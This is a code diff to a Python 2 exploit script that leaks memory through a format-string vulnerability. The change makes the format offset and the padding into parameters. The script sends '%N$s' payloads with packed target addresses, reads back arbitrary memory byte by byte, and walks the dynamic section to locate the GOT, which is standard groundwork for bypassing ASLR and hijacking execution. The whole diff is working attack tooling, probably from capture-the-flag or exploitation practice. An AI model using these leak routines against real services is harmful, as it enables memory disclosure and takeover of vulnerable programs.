@@ -5,31 +5,35 @@ import sys
 
 saveSocket = None
 
-def leak(s,address):
-  data = "%8$pBBBB" + pack(address)
+def leak(s,offset,pad,address):
+  data = "%"+str(offset)+"$pBBBB" + pack(address)
   if "\n" in data:
     print " [!] newline in payload!"
     return ""
   try:
-    s.sendline("%8$sAAAA" + pack(address))
+    s.sendline("%"+str(offset)+"$s"+"A"*pad + pack(address))
   except EOFError:
     raise EOFError
   try:
     data = s.recv()
-    print "[R] leaked %d bytes at %x " % (len(data.split("AAAA")[0]),address)
+    print "[R] leaked %d bytes at %x " % (len(data.split("A"*pad)[0]),address)
   except EOFError:
     print "[X] EOFError trying to leak from %x" % address
-     
+    
     return None
-  (code,junk) = data.split("AAAA")
+  (code,junk) = data.split("A"*pad)
   return code
 
-def leak_code(s,address,size):
+def leak_code(s,l_offset,l_pad,address,size):
+  global offset
+  global pad
+  offset = l_offset 
+  pad = l_pad
   remainingSize = size
   out = bytearray("")
   while remainingSize > 0:
     try:
-      data = leak(s,address + size - remainingSize)
+      data = leak(s,offset,pad,address + size - remainingSize)
     except EOFError:
       return out
     if data == None:
@@ -42,9 +46,11 @@ def leak_code(s,address,size):
 
 def leakFour(address):
   global saveSocket
+  global offset
+  global pad
   print "[+] Called with addr %x" % address
   try:
-    data = leak_code(saveSocket,address,4)[0:4]
+    data = leak_code(saveSocket,offset,pad,address,4)[0:4]
     print binascii.hexlify(data)
     return str(data)
   except:
@@ -66,8 +72,10 @@ def leak_libc(d, func):
 
 def find_got(s,dynamic_ptr):
     addr = dynamic_ptr
+    global offset
+    global pad
     while True:
-        x = leak(s,addr)
+        x = leak(s,offset,pad,addr)
         if x == '\x03': # type PLTGOT
             addr += 4
             got_addr = unpack(leakFour(addr))
